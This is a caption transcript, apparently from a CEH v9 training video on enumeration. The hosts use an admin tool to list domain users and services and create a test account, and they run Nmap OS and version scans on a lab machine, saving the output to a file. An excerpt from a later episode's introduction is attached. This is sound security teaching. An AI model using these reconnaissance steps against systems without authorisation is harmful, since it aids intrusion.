00:48:58.090\nI got a list of all the users here and\nthe group so\n\n1081\n00:48:58.090 --> 00:48:59.370\nI can get that separately of course,\n\n1082\n00:48:59.370 --> 00:49:01.825\nthat's in one of the other parts of\nthe tool but I got them all right there.\n\n1083\n00:49:01.825 --> 00:49:05.190\nThere's my administrator\naccount built right in.\n\n1084\n00:49:05.190 --> 00:49:09.290\nI can see information about it such\nas what groups it is a member of.\n\n1085\n00:49:09.290 --> 00:49:12.840\nAnd I can see a description and\nthe directory name, so\n\n1086\n00:49:12.840 --> 00:49:15.090\nI can find that information right here.\n\n1087\n00:49:15.090 --> 00:49:17.820\nIf you've renamed that account,\nby the way, I'll find the rename,\n\n1088\n00:49:17.820 --> 00:49:18.370\nso I'll know it.\n\n1089\n00:49:18.370 --> 00:49:21.770\nNow I can look up the grid, and\nI can see, or the SID route exceeds 500.\n\n1090\n00:49:21.770 --> 00:49:23.200\n>> Yeah.\n>> Even if you rename it, so\n\n1091\n00:49:23.200 --> 00:49:23.870\nI'll know that.\n\n1092\n00:49:23.870 --> 00:49:25.340\nBut I don't have to go to that trouble.\n\n1093\n00:49:25.340 --> 00:49:27.080\nCuz remember, if you piss off the hacker,\n\n1094\n00:49:27.080 --> 00:49:30.030\nthey're likely to do more damage cuz\nyou made them work harder, right?\n\n1095\n00:49:30.030 --> 00:49:31.860\n>> [LAUGH] Yeah,\nI had to really work to get that.\n\n1096\n00:49:31.860 --> 00:49:32.380\n>> Absolutely.\n\n1097\n00:49:32.380 --> 00:49:34.989\nSo I could go grab properties,\nright click on this one.\n\n1098\n00:49:35.990 --> 00:49:37.570\nGive it a second to come up.\n\n1099\n00:49:37.570 --> 00:49:40.470\nAnd I can see the information\non this account.\n\n1100\n00:49:40.470 --> 00:49:43.690\nNow look, I can open up the account here,\nI'll see all that information.\n\n1101\n00:49:43.690 --> 00:49:46.540\nI've got the display name,\nI've got the password.\n\n1102\n00:49:46.540 --> 00:49:47.980\nI can modify the password here.\n\n1103\n00:49:47.980 --> 00:49:49.780\nAgain, I have to have rights\nto do this part, right?\n\n1104\n00:49:49.780 --> 00:49:52.110\nSo I'm gonna have to have an account\nthat has rights to do this,\n\n1105\n00:49:52.110 --> 00:49:53.490\nbut Look at what I'm able to do.\n\n1106\n00:49:53.490 --> 00:49:55.950\nThis is essentially like ADAC, right?\n\n1107\n00:49:55.950 --> 00:50:01.350\nThe Active Directory Administration Center\ntool or the User Computer Management tool\n\n1108\n00:50:01.350 --> 00:50:06.350\nand services and trusts and\nall that on one.\n\n1109\n00:50:06.350 --> 00:50:10.160\nAnd I've got the ability to add and remove\ngroups, change profiles, you name it here.\n\n1110\n00:50:10.160 --> 00:50:14.150\nOn any account, and all I have to do\nis just simply right click and do that.\n\n1111\n00:50:14.150 --> 00:50:15.910\nI could do that right from here.\n\n1112\n00:50:15.910 --> 00:50:19.670\nI can go in down here, I can see\nthe domain controllers, see what they are.\n\n1113\n00:50:19.670 --> 00:50:24.620\nI can go profile them so I can see\nwhat services may be running here.\n\n1114\n00:50:24.620 --> 00:50:26.930\nI could view running, non running, look,\n\n1115\n00:50:26.930 --> 00:50:29.410\nthat's the list of services running\non the domain controller right now.\n\n1116\n00:50:29.410 --> 00:50:29.940\n>> Wow.\n\n1117\n00:50:29.940 --> 00:50:34.540\n>> Pull that up, I can see what's running\nright there and click on that service.\n\n1118\n00:50:34.540 --> 00:50:35.720\nYou think that was cool?\n\n1119\n00:50:35.720 --> 00:50:38.030\nI can right click on\nthe service right there,\n\n1120\n00:50:38.030 --> 00:50:42.830\njust gonna be like crazy wacky and\nbits is not running.\n\n1121\n00:50:42.830 --> 00:50:44.570\nThat may be Something to consider.\n\n1122\n00:50:44.570 --> 00:50:47.435\nActually we don't want to do that because\nI stopped it from doing windows updates.\n\n1123\n00:50:47.435 --> 00:50:48.760\n>> [LAUGH]\n>> That would be bad.\n\n1124\n00:50:48.760 --> 00:50:51.190\nBut let's say let's go in there and\n\n1125\n00:50:51.190 --> 00:50:53.010\nlet's grab one that's really\nnot going to be a big deal.\n\n1126\n00:50:53.010 --> 00:50:55.640\nYeah so like remote access right?\n\n1127\n00:50:55.640 --> 00:50:56.795\nThat's not running.\n\n1128\n00:50:56.795 --> 00:50:58.105\nI may want that running.\n\n1129\n00:50:58.105 --> 00:51:01.025\nOkay, well if I want that running, right,\n\n1130\n00:51:01.025 --> 00:51:05.285\nI may be able to go do that,\nbut you'll see there, right.\n\n1131\n00:51:05.285 --> 00:51:09.445\nI could right click potentially, but it\nsays this service cannot be started either\n\n1132\n00:51:09.445 --> 00:51:12.165\nbecause it's disabled because it has\nno enabled device associated with it.\n\n1133\n00:51:12.165 --> 00:51:16.295\nIn other words that service is tied to\na feature that has to be installed and\n\n1134\n00:51:16.295 --> 00:51:17.735\nconfigured for it to run.\n\n1135\n00:51:17.735 --> 00:51:21.070\nSo just because I see the service\ndoesn't mean I can start it necessarily.\n\n1136\n00:51:21.070 --> 00:51:22.890\nIn the newer versions of the OS.\n\n1137\n00:51:22.890 --> 00:51:25.200\nIn the older versions,\nI could actually turn it on.\n\n1138\n00:51:25.200 --> 00:51:28.150\nIn this one, the service is\ndisabled because the feature that\n\n1139\n00:51:28.150 --> 00:51:30.260\nis associated with it is not installed.\n\n1140\n00:51:30.260 --> 00:51:33.000\nNow I know it is not installed cuz I know\nhow the demand controller was built.\n\n1141\n00:51:33.000 --> 00:51:36.750\nBut if the demand controller had it\nrunning, if the feature was installed\n\n1142\n00:51:36.750 --> 00:51:39.520\nI could disable or enable that\nservice at will, from this tool.\n\n1143\n00:51:39.520 --> 00:51:45.030\nSo, knowing my tools, understanding their\nfunctionality, knowing the system, or not\n\n1144\n00:51:45.030 --> 00:51:48.860\nknowing the system but deriving from that\nerror, and that feature's not installed.\n\n1145\n00:51:48.860 --> 00:51:52.350\nAnd then saying as a hacker,\nyou know I want to be able to use that.\n\n1146\n00:51:52.350 --> 00:51:54.430\nSo I got to go hack that box.\n\n1147\n00:51:54.430 --> 00:51:58.310\nPut remote admin in there or\nremote access you know the functionality.\n\n1148\n00:51:58.310 --> 00:52:02.730\nInstall that so that I can then set up\na bridge to be able to go somewhere and\n\n1149\n00:52:02.730 --> 00:52:04.810\nhave to go hack into a box and\ninstall that feature.\n\n1150\n00:52:04.810 --> 00:52:07.470\nSo I now know what's going there, right.\n\n1151\n00:52:07.470 --> 00:52:08.700\nSo I've got servers here.\n\n1152\n00:52:08.700 --> 00:52:11.190\nI've got groups users global\ngroups universal groups\n\n1153\n00:52:11.190 --> 00:52:14.490\nI said I would show you how to\ncreate a user so let's do this.\n\n1154\n00:52:14.490 --> 00:52:15.380\nLet's create a new user.\n\n1155\n00:52:16.440 --> 00:52:20.210\nCreating well I'm gonna create it right so\nI can go Create the user or\n\n1156\n00:52:20.210 --> 00:52:25.430\nI can browse and\nput that user into a specific OU, right?\n\n1157\n00:52:25.430 --> 00:52:27.120\nLet's say I wanna create users though.\n\n1158\n00:52:27.120 --> 00:52:28.920\nYou ought to go there by\ndefault by the way, but.\n\n1159\n00:52:28.920 --> 00:52:30.539\nSo I could do that.\n\n1160\n00:52:32.000 --> 00:52:35.180\nClick Okay and you already saw this\npanel come up when I was using,\n\n1161\n00:52:35.180 --> 00:52:37.040\nwhen I right clicked on Admin Manager.\n\n1162\n00:52:37.040 --> 00:52:39.380\nSp, look if you want to edit everything,\nit's right there.\n\n1163\n00:52:39.380 --> 00:52:40.630\nSo, I can go and I can do that.\n\n1164\n00:52:40.630 --> 00:52:44.330\nSo, I what do I call our user?\n\n1165\n00:52:44.330 --> 00:52:46.615\n>> Meagan wants an account on our system.\n\n1166\n00:52:46.615 --> 00:52:47.889\n>> M-E-G-A-N?\n\n1167\n00:52:47.889 --> 00:52:49.466\n>> M-E-A-G-A-N.\n\n1168\n00:52:49.466 --> 00:52:52.291\nM-E-A-G-A-N, okay?\n\n1169\n00:52:52.291 --> 00:52:55.060\nBecause we don't want\nMeagan upset at us for\n\n1170\n00:52:55.060 --> 00:52:58.400\nmisspelling her name, otherwise suddenly\nthe stream stops working again.\n\n1171\n00:52:58.400 --> 00:53:00.455\n>> Yeah, I know.\n>> Because you know that never happens.\n\n1172\n00:53:00.455 --> 00:53:01.600\n[LAUGH] Right?\n\n1173\n00:53:01.600 --> 00:53:05.070\nAlright, so, display name, right,\nwe'll give Meagan's display name.\n\n1174\n00:53:05.070 --> 00:53:06.150\nYou know, whatever we want to call it.\n\n1175\n00:53:06.150 --> 00:53:07.410\nMaybe Meagan.\n\n1176\n00:53:07.410 --> 00:53:09.780\nYour IT pro writes something like that.\n\n1177\n00:53:09.780 --> 00:53:12.260\nYou know a description,\nright, and then the password,\n\n1178\n00:53:12.260 --> 00:53:14.300\nwhatever password we would want to use.\n\n1179\n00:53:14.300 --> 00:53:18.310\nI'll just give her a capital M,\nwe'll just do that as her password.\n\n1180\n00:53:18.310 --> 00:53:22.200\nClick set, that sets the password By the\nway if we do that and the passwords don't\n\n1181\n00:53:22.200 --> 00:53:25.140\nmatch, it comes back, throws an error\nup and says, hey passwords don't match.\n\n1182\n00:53:25.140 --> 00:53:27.880\n>> So now we know what their\npassword policy is or what\n\n1183\n00:53:27.880 --> 00:53:29.060\n>> Well, we know that we have a mismatch\n\n1184\n00:53:29.060 --> 00:53:30.040\non the type right.\n\n1185\n00:53:30.040 --> 00:53:31.100\n>> Okay\n>> So we know that.\n\n1186\n00:53:31.100 --> 00:53:34.030\nSo then we have user must\nchange password next logon\n\n1187\n00:53:34.030 --> 00:53:37.880\nLet's make it User Cannot Change Password,\nNever Expires, and we'll be nice and\n\n1188\n00:53:37.880 --> 00:53:41.055\ndisable her account because we don't\nactually want somebody hacking in there.\n\n1189\n00:53:41.055 --> 00:53:42.380\n>> [LAUGH]\n>> And then we could go ahead,\n\n1190\n00:53:42.380 --> 00:53:44.000\nwe could set up her profile.\n\n1191\n00:53:44.000 --> 00:53:46.480\nWe could set up the hours available for\nlog on.\n\n1192\n00:53:46.480 --> 00:53:51.370\nWe can actually allow her to log on only\nto local or any machine in the domain.\n\n1193\n00:53:51.370 --> 00:53:51.900\nRight?\n>> Mm-hm.\n\n1194\n00:53:51.900 --> 00:53:54.490\n>> We could specify\nthe Account Type in there.\n\n1195\n00:53:54.490 --> 00:53:56.330\nWe can go ahead specify Dial-up, right?\n\n1196\n00:53:56.330 --> 00:53:57.980\nSo, if she's supposed to have a modem.\n\n1197\n00:53:57.980 --> 00:54:01.400\nRight all sorts of stuff, so we go through\ndo everything, we'll go ahead click add.\n\n1198\n00:54:03.110 --> 00:54:03.790\nWhat happen there,\n\n1199\n00:54:03.790 --> 00:54:06.230\nthe password doesn't meet password\npolicy requirements, there we go.\n\n1200\n00:54:06.230 --> 00:54:10.750\nOkay so, it told me, hey the password's\nnot, cuz we do have a complex password.\n\n1201\n00:54:10.750 --> 00:54:13.550\nI forgot we do have a complex password\nrequirement, says it's not gonna work.\n\n1202\n00:54:13.550 --> 00:54:15.210\nBut although, I mean I can see again,\n\n1203\n00:54:15.210 --> 00:54:18.190\nthinking like that hacker,\nyou're gaining more information.\n\n1204\n00:54:18.190 --> 00:54:21.880\nnow I know that they've enabled complexity\nor enabled a certain a password length.\n\n1205\n00:54:21.880 --> 00:54:23.750\nSo just doing that process and\n\n1206\n00:54:23.750 --> 00:54:25.510\ngetting that error is actually\nteaching us something.\n\n1207\n00:54:26.740 --> 00:54:27.710\n>> Stupid me.\n\n1208\n00:54:27.710 --> 00:54:28.440\nWiped out her name.\n\n1209\n00:54:28.440 --> 00:54:31.070\nNo I just [INAUDIBLE] cleared When it\ngave me the error it cleared the screen.\n\n1210\n00:54:31.070 --> 00:54:32.900\nSo it didn't actually have her name on it.\n\n1211\n00:54:32.900 --> 00:54:34.830\nSo just got to put that back that's all.\n\n1212\n00:54:34.830 --> 00:54:37.840\nAll right, so we got that,\ngot that and then.\n\n1213\n00:54:37.840 --> 00:54:39.570\n>> He started see if she's there.\n\n1214\n00:54:39.570 --> 00:54:42.270\n>> Click add,\nWhat the hell happened there?\n\n1215\n00:54:42.270 --> 00:54:45.250\nI’m able to add modify\nuser extended error.\n\n1216\n00:54:45.250 --> 00:54:49.150\nI may just be I just maybe because\nI tried it, it's already there.\n\n1217\n00:54:49.150 --> 00:54:51.810\nIt may actually already be there,\nlet me just check real quick and\n\n1218\n00:54:51.810 --> 00:54:53.590\nsee cuz sometimes it put it in.\n\n1219\n00:54:53.590 --> 00:54:54.898\n>> I want to say the creative.\n\n1220\n00:54:54.898 --> 00:54:55.772\n>> Yeah, no.\nIt's already there.\n\n1221\n00:54:55.772 --> 00:54:56.722\nIt's actually already there.\n\n1222\n00:54:56.722 --> 00:54:57.558\nThat's why I gave you the r.\n\n1223\n00:54:57.558 --> 00:55:00.085\nIf you take a look, you'll see right\nthere that it didn't The first time,\n\n1224\n00:55:00.085 --> 00:55:02.765\neven though it said\npassword policy not good.\n\n1225\n00:55:02.765 --> 00:55:05.475\nI created the account I just\nhave to change the password.\n\n1226\n00:55:05.475 --> 00:55:08.165\nBut you could see there,\nnot only did it create it, but\n\n1227\n00:55:08.165 --> 00:55:09.825\nit is actually created and disabled.\n\n1228\n00:55:09.825 --> 00:55:10.455\n>> Yes.\n>> So\n\n1229\n00:55:10.455 --> 00:55:13.220\nyou could see the user was put in\n>> And then I can modify it.\n\n1230\n00:55:13.220 --> 00:55:14.705\nI did one called Hyena Test.\n\n1231\n00:55:14.705 --> 00:55:16.650\n>> Mm-hm.\n>> Right before I put it in there as well.\n\n1232\n00:55:16.650 --> 00:55:19.280\nSo you can see I'm actually able\nto go in and create the user.\n\n1233\n00:55:19.280 --> 00:55:19.810\n>> Nice.\n\n1234\n00:55:19.810 --> 00:55:20.490\n>> That was pretty cool.\n\n1235\n00:55:20.490 --> 00:55:21.139\nSo we like Hyena [CROSSTALK]\n>> But\n\n1236\n00:55:21.139 --> 00:55:22.725\nyou still haven't authenticated, correct?\n\n1237\n00:55:22.725 --> 00:55:23.820\n>> I did when I started,\n\n1238\n00:55:23.820 --> 00:55:27.600\nI did when I loaded the tool\nthe first time to do that piece.\n\n1239\n00:55:27.600 --> 00:55:29.100\n>> Okay.\n>> So it did prompt me for credentials.\n\n1240\n00:55:29.100 --> 00:55:30.660\nI did have to authenticate The first time,\n\n1241\n00:55:30.660 --> 00:55:33.815\nyou just don't see it in the particular\nexercise exchange we're doing.\n\n1242\n00:55:33.815 --> 00:55:35.380\n>> Mm-hm.\n>> But I did authenticate to be able\n\n1243\n00:55:35.380 --> 00:55:37.410\nto do the user piece\nwhen I did Hyena test.\n\n1244\n00:55:37.410 --> 00:55:40.270\nSo it already had the credential cached,\nthat's why it didn't ask me again.\n\n1245\n00:55:40.270 --> 00:55:42.080\nNow that would actually be wicked, right?\n\n1246\n00:55:42.080 --> 00:55:43.860\nIf I could do that without\nhaving to authenticate.\n\n1247\n00:55:43.860 --> 00:55:46.640\nThat would be Kind of a problem,\nso let me just login.\n\n1248\n00:55:47.800 --> 00:55:48.460\nAnd oops!\n\n1249\n00:55:48.460 --> 00:55:49.585\nSorry, let me.\n\n1250\n00:55:54.420 --> 00:55:56.350\nDo that, log back in.\n\n1251\n00:55:56.350 --> 00:55:58.330\nAnd we should be done with our scan there.\n\n1252\n00:55:58.330 --> 00:56:00.610\nOkay, yes, so it did go do the OS scan.\n\n1253\n00:56:00.610 --> 00:56:02.660\nGave us the same output as last time.\n\n1254\n00:56:02.660 --> 00:56:08.561\nCould be Windows 7 right here Could\nbe Windows 7, 2008 Android 8.1.\n\n1255\n00:56:08.561 --> 00:56:09.939\nYou could see it up there in cali.\n\n1256\n00:56:09.939 --> 00:56:11.679\nShows me the OS version, right?\n\n1257\n00:56:11.679 --> 00:56:13.749\n>> Mm-hm.\n>> We finish the scan so we can see that.\n\n1258\n00:56:13.749 --> 00:56:18.747\nSo, if we want to be able to do\nthe same thing but on Mike's machine,\n\n1259\n00:56:18.747 --> 00:56:20.079\nwhat was your IP?\n\n1260\n00:56:20.079 --> 00:56:21.797\n141?\n>> Yeah, 141.\n\n1261\n00:56:21.797 --> 00:56:23.656\n>> 141, all right?\n\n1262\n00:56:23.656 --> 00:56:24.441\nOkay.\n\n1263\n00:56:24.441 --> 00:56:28.810\nSo if we load that one, that's gonna go\nout and try to profile the Mac machine.\n\n1264\n00:56:28.810 --> 00:56:31.770\nSo we'll come back, see what it tells\nus about Mac, and then I told you I\n\n1265\n00:56:31.770 --> 00:56:36.330\nwould go ahead and I would show you what\nit will take to be able to output that.\n\n1266\n00:56:36.330 --> 00:56:38.220\nSo we can see there,\nthat one was much quicker.\n\n1267\n00:56:38.220 --> 00:56:39.050\nI went ahead and\n\n1268\n00:56:39.050 --> 00:56:43.310\nit scanned, too many fingerprints matched\nthis host to give specific OS details.\n\n1269\n00:56:43.310 --> 00:56:47.270\nIn other words, it's telling me that it's\nnot able to zero in on that OS because\n\n1270\n00:56:47.270 --> 00:56:51.670\nthere's too many things that it may be,\nand it's not able to discern what it is\n\n1271\n00:56:51.670 --> 00:56:56.440\nwith enough information to be relatively\nconfident that it gives it back to me.\n\n1272\n00:56:56.440 --> 00:56:59.780\nProving yet again that Microsoft is one\nof the most secure operating systems\n\n1273\n00:56:59.780 --> 00:57:00.875\non the planet, right?\n\n1274\n00:57:00.875 --> 00:57:02.760\n>> [LAUGH]\n>> No, Microsoft immediately, yeah,\n\n1275\n00:57:02.760 --> 00:57:03.560\nit's gotta be that, right?\n\n1276\n00:57:03.560 --> 00:57:06.140\nCuz we know it's immediately,\nit's Windows 8.1, right?\n\n1277\n00:57:06.140 --> 00:57:08.160\nWhereas the Mac OS,\nwe have no clue what that is.\n\n1278\n00:57:08.160 --> 00:57:11.690\nThat could be Zanix or\nsome crazy thing, we just don't know.\n\n1279\n00:57:11.690 --> 00:57:12.730\nSo we can't tell you.\n\n1280\n00:57:12.730 --> 00:57:13.480\nSo, remember,\n\n1281\n00:57:13.480 --> 00:57:16.914\nusing more than one tool is gonna\npotentially give you different outcomes.\n\n1282\n00:57:16.914 --> 00:57:19.124\nWe talked about this in one\nof our prior conversations,\n\n1283\n00:57:19.124 --> 00:57:22.370\nin one of the earlier episodes, where I'd\nmade reference to the fact that, hey,\n\n1284\n00:57:22.370 --> 00:57:25.164\nI always use more than one tool to\nvalidate that information, right?\n\n1285\n00:57:25.164 --> 00:57:27.023\n>> Trust by verify type, yeah.\n\n1286\n00:57:27.023 --> 00:57:28.098\n>> Exactly.\n\n1287\n00:57:28.098 --> 00:57:32.400\nJust because Nmap running in Cali\ncan't tell me that's a Mac machine,\n\n1288\n00:57:32.400 --> 00:57:33.770\ndoesn't mean I can't find that out.\n\n1289\n00:57:33.770 --> 00:57:36.470\nIf you remember the Windows tools,\nlike MegaPing and\n\n1290\n00:57:36.470 --> 00:57:40.390\nsome of the others, told me that\nit was most likely a Mac machine.\n\n1291\n00:57:40.390 --> 00:57:43.920\nSo, I can get that information from\na couple of different places, but\n\n1292\n00:57:43.920 --> 00:57:47.740\nI have to have a sense of that, and\nI have to know what that is, right?\n\n1293\n00:57:47.740 --> 00:57:51.850\nSo if we build on the string we\nwere just doing, Nmap minus s for\n\n1294\n00:57:51.850 --> 00:57:56.130\nscan, S Delphi scan, v for go out and\n\n1295\n00:57:56.130 --> 00:58:01.020\nfind version minus O for operating\nsystem and then whatever the target is,\n\n1296\n00:58:01.020 --> 00:58:04.190\nif I wanna do all that,\nthen what I wanna do is output, right?\n\n1297\n00:58:04.190 --> 00:58:07.000\nSo then minus lower case o, right?\n\n1298\n00:58:07.000 --> 00:58:12.950\nOutput to wherever I want to put it, so\nI'm gonna specify that I wanna call this,\n\n1299\n00:58:12.950 --> 00:58:15.910\nI don't know, numeration.text or whatever.\n\n1300\n00:58:15.910 --> 00:58:21.040\nI'll just call it mike.txt cuz that's\nessentially what I'm gonna get.\n\n1301\n00:58:21.040 --> 00:58:25.000\nSo if I do that, then it's gonna\noutput to a text file for me and\n\n1302\n00:58:25.000 --> 00:58:29.900\nit's gonna let me then get that\ninformation and take a look, right.\n\n1303\n00:58:29.900 --> 00:58:33.004\nSo the idea is that I could just output\nthat information if I wanted to and\n\n1304\n00:58:33.004 --> 00:58:34.315\nbe able to go see the results.\n\n1305\n00:58:34.315 --> 00:58:38.901\nInstead of echoing it out to the console\nand not having it, then I could, and\n\n1306\n00:58:38.901 --> 00:58:42.343\nactually this time's interesting,\nthis time it ran and\n\n1307\n00:58:42.343 --> 00:58:46.524\nit actually told me it was Apple iOS 6.x,\nor Apple iPhone OS 1.x.\n\n1308\n00:58:46.524 --> 00:58:51.040\nSo it may have this time been able to just\nget more information for some reason.\n\n1309\n00:58:51.040 --> 00:58:52.560\nMaybe it just actually\ngot it back this time.\n\n1310\n00:58:52.560 --> 00:58:55.910\nNow are you running something\non the 6.x family there?\n\n1311\n00:58:55.910 --> 00:58:57.250\n>> Let's see.\n>> I'm just curious if that's\n\n1312\n00:58:57.250 --> 00:58:58.170\nclose to accurate.\n\n1313\n00:58:58.170 --> 00:58:59.902\nI know you're not running Apple iPhone.\n\n1314\n00:58:59.902 --> 00:59:01.297\n[CROSSTALK] And so\nwe know it's not an iPhone.\n\n1315\n00:59:01.297 --> 00:59:02.210\nWe know that part.\n\n1316\n00:59:02.210 --> 00:59:05.733\nI'm just curious if it actually was\nsomething potentially that actually\n\n1317\n00:59:05.733 --> 00:59:07.280\nwas close to being legitimate.\n\n1318\n00:59:08.360 --> 00:59:09.740\n>> About this Mac.\n\n1319\n00:59:09.740 --> 00:59:14.200\nI am running version 10.1, 10.11.\n\n1320\n00:59:14.200 --> 00:59:17.818\n>> All right, so it's [CROSSTALK]\nobviously not pulling like accurate data.\n\n1321\n00:59:17.818 --> 00:59:21.729\nNow it's at least, okay, yeah,\nI'm in the Apple family, but 6.X and\n\n1322\n00:59:21.729 --> 00:59:24.710\n10.X are a little bit different,\ndistant, right.\n\n1323\n00:59:24.710 --> 00:59:29.615\nSo yeah, this may not necessarily give\nyou the best information all the time,\n\n1324\n00:59:29.615 --> 00:59:30.285\njust like every tool.\n\n1325\n00:59:30.285 --> 00:59:33.605\nThere may be some compromising\ninformation there that's valuable,\n\n1326\n00:59:33.605 --> 00:59:36.285\nthere may be some information\nwe gotta go back and forth on.\n\n1327\n00:59:36.285 --> 00:59:40.692\nBut the point is that we could do that,\nand if we do that do that and do enough of\n\n1328\n00:59:40.692 --> 00:59:44.982\nit, we may then be able to go in and\nto get some information cross referenced.\n\n1329\n00:59:44.982 --> 00:59:46.142\nSo we outputted it.\n\n1330\n00:59:46.142 --> 00:59:47.832\nLet's just take a look at the text file,\nright.\n\n1331\n00:59:47.832 --> 00:59:48.822\nLast thing we want to do.\n\n1332\n00:59:48.822 --> 00:59:52.510\nSo you see I just went in and\nI went to the files icon on the little nav\n\n1333\n00:59:52.510 --> 00:59:56.260\nbar on the left there, sitting on the root\nright there, right in the home directory.\n\n1334\n00:59:56.260 --> 00:59:57.790\nWhat do we got?\nMike.txt.\n\n1335\n00:59:57.790 --> 00:59:58.410\nRight?\n\n1336\n00:59:58.410 --> 01:00:02.190\nSo if I open that up,\nI can see the output or\n\n1337\n01:00:02.190 --> 01:00:04.680\nI could find the information or\ndo whatever I want to do with it.\n\n1338\n01:00:04.680 --> 01:00:05.870\nI can CAT it.\n\n1339\n01:00:05.870 --> 01:00:07.100\nI can do all sorts of stuff with it.\n\n1340\n01:00:07.100 --> 01:00:09.250\nRight?\nSo you could see the file there, right?\n\n1341\n01:00:09.250 --> 01:00:10.650\n>> Yeah.\n>> That's all we gotta do is just output\n\n1342\n01:00:10.650 --> 01:00:12.450\nit and then we go grab it and\ndo something with it.\n\n1343\n01:00:12.450 --> 01:00:15.450\n>> This could become part of your\ndeliverables if you're doing this for\n\n1344\n01:00:15.450 --> 01:00:18.330\nan organization or something like that or\njust a record for you.\n\n1345\n01:00:18.330 --> 01:00:21.350\nAs you said, you're going through and\nas you're working through this network,\n\n1346\n01:00:21.350 --> 01:00:25.180\nyou're scanning and hitting several\ndifferent machines most likely,\n\n1347\n01:00:25.180 --> 01:00:26.570\ntrying to keep it all straight,\nat least for me.\n\n1348\n01:00:26.570 --> 01:00:28.480\nYou don't have to scroll\nback up through that prompt.\n\n1349\n01:00:28.480 --> 01:00:31.810\nIf you run out of buffer, definitely\nnice to be able to get that hard copy.\n\n1350\n01:00:31.810 --> 01:00:33.100\n>> Yeah, short buffer syndrome.\n\n1351\n01:00:33.100 --> 01:00:33.800\nThat's a problem.\n\n1352\n01:00:33.800 --> 01:00:34.529\n>> Yeah.\nYeah, yeah, yeah, yeah.\n\n1353\n01:00:34.529 --> 01:00:35.029\n[LAUGH]\n>> Yeah.\n\n1354\n01:00:35.029 --> 01:00:37.281\nYes, that's a big issue especially if\n\n1355\n01:00:37.281 --> 01:00:39.887\nyou're over 25.\nIt could be a very big issue.\n\n1356\n01:00:39.887 --> 01:00:40.540\n>> But they've got a pill for\n\n1357\n01:00:40.540 --> 01:00:41.192\nthat now.\n>> They do\n\n1358\n01:00:41.192 --> 01:00:42.000\nnow.\nAbsolutely.\n\n1359\n01:00:42.000 --> 01:00:42.990\nThey do, they've come up,\n\n1360\n01:00:42.990 --> 01:00:44.220\nscience is a wonderful thing.\n>> [LAUGH]\n\n1361\n01:00:44.220 --> 01:00:46.110\n>> So you can see, I've opened it with.\n\n1362\n01:00:46.110 --> 01:00:47.440\nI just right-click right on the text file.\n\n1363\n01:00:47.440 --> 01:00:49.437\nGE Edit is the generic text editor in\n\n1364\n01:00:49.437 --> 01:00:52.590\nthere, kinda the Linux version of Notepad,\nright?\n\n1365\n01:00:52.590 --> 01:00:53.970\nAnd you can see, all I do is right-click,\n\n1366\n01:00:53.970 --> 01:00:56.665\nopen with geedit, and you can see it's\nall right there as Mike was saying.\n\n1367\n01:00:56.665 --> 01:00:57.615\nAnd I can open it.\n\n1368\n01:00:57.615 --> 01:00:58.205\nI can save it,\n\n1369\n01:00:58.205 --> 01:01:00.470\nexport it, do all sorts of stuff with it.\nSo\n\n1370\n01:01:00.470 --> 01:01:02.355\nyou could see we're able to output that,\nand\n\n1371\n01:01:02.355 --> 01:01:05.235\nit gives us the same exact information.\nAnd it's nice because then,\n\n1372\n01:01:05.235 --> 01:01:08.155\nas Mike said, I'm not worried about\nchasing it through the buffer trying to\n\n1373\n01:01:08.155 --> 01:01:09.985\nfigure out what it is.\nAnd wait, I needed that.\n\n1374\n01:01:09.985 --> 01:01:14.055\nAnd darn, it's all gone because it ran out\nof space, and it's overwritten itself.\n\n1375\n01:01:14.055 --> 01:01:15.925\nThat kind of thing can happen, obviously.\n\n1376\n01:01:15.925 --> 01:01:18.875\nSo a little bit of insight into how we\ncan do a bunch of different enumeration\n\n1377\n01:01:18.875 --> 01:01:23.300\noptions, both from Windows, from Linux,\nusing a variety of different tools, right,\n\n1378\n01:01:23.300 --> 01:01:24.310\nto be able to go do that stuff.\n\n1379\n01:01:24.310 --> 01:01:27.550\nAnd to show you a lot of different methods\nthat will cross reference that knowledge\n\n1380\n01:01:27.550 --> 01:01:28.270\nfor us.\n\n1381\n01:01:28.270 --> 01:01:31.680\nAllowing us to make sure that we can\nactually test the knowledge we get.\n\n1382\n01:01:31.680 --> 01:01:32.180\nAs we said.\n\n1383\n01:01:32.180 --> 01:01:33.090\nAs we showed you.\n\n1384\n01:01:33.090 --> 01:01:35.470\nRight?\nThat the OS detection on the Mac may not\n\n1385\n01:01:35.470 --> 01:01:38.750\nhave been accurate, but yet we got better\ninformation using one of the Windows or\n\n1386\n01:01:38.750 --> 01:01:41.240\nseveral of the Windows derivative\ntools to let us zero in.\n\n1387\n01:01:41.240 --> 01:01:44.690\nAnd remember, it's about triangulating,\ncoming from different perspectives to\n\n1388\n01:01:44.690 --> 01:01:47.925\ncross reference that information and\nvalidate that it is legitimate.\n\n1389\n01:01:47.925 --> 01:01:49.540\nIt's very important to think about that.\n\n1390\n01:01:49.540 --> 01:01:51.750\n>> All right, Adam,\ngreat demonstrations here,\n\n1391\n01:01:51.750 --> 01:01:54.650\nreally taking a look at some of\nthe different tools that we can use\n\n1392\n01:01:54.650 --> 01:01:57.080\nas we work our way through\nthat enumeration phase.\n\n1393\n01:01:57.080 --> 01:01:58.420\nSo we thank you for that.\n\n1394\n01:01:58.420 --> 01:02:00.120\nHope everybody out there enjoyed watching.\n\n1395\n01:02:00.120 -->

00:00:19.334\nI'm your host Mike Rodrick and\ntoday, we're doing CEH version 9.\n\n4\n00:00:19.334 --> 00:00:21.158\nAnd specifically in this episode,\n\n5\n00:00:21.158 --> 00:00:24.393\nwe're gonna be continuing our\nconversation on enumeration.\n\n6\n00:00:24.393 --> 00:00:26.871\nWe've already taken a good\nlook at enumeration,\n\n7\n00:00:26.871 --> 00:00:29.482\ntalked about kinda what it is,\nconcepts behind it.\n\n8\n00:00:29.482 --> 00:00:31.865\nWe also does some really\ncool demonstrations, so\n\n9\n00:00:31.865 --> 00:00:35.679\nif you missed those make sure you go back\nand check out those previous episodes.\n\n10\n00:00:35.679 --> 00:00:39.175\nBut now we're going to continue on\nour discussion of a little some more\n\n11\n00:00:39.175 --> 00:00:40.545\nfacts about enumeration.\n\n12\n00:00:40.545 --> 00:00:42.415\nAnd here for that is Mr. Adam Gordon.\n\n13\n00:00:42.415 --> 00:00:43.450\nHow are you doing, Adam?\n\n14\n00:00:43.450 --> 00:00:46.356\n>> Good, good, I am ready to enumerate\nour discussion on enumeration.\n\n15\n00:00:46.356 --> 00:00:48.960\n>> [LAUGH]\n>> List the list as they say.\n\n16\n00:00:48.960 --> 00:00:50.520\nWe're gonna dug a little\ndeeper as Mike was saying.\n\n17\n00:00:50.520 --> 00:00:52.840\nWhat we're gonna do is actually recap\na little bit 